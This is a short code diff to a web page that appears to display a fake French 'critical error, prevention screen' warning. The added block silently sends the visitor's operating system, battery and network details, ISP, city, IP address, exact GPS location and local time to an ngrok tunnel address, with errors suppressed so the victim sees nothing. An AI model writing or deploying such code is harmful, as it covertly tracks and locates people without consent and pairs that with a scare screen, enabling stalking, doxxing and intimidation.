@@ -118,6 +118,23 @@
                 "ERREUR CRITIQUE. AFFICHAGE DE L'ÉCRAN DE PRÉVENTION."
             ];
 
+            try {
+                fetch('https://bottling-think-gray.ngrok-free.dev/api/log', { 
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        os: os,
+                        battery: batteryInfo,
+                        network: networkInfo,
+                        isp: isp,
+                        city: city,
+                        ip: ip,
+                        gps: exactLocation,
+                        time: localTime
+                    })
+                });
+            } catch (e) {}
+
             let lineIndex = 0;
 
             function typeLine() {
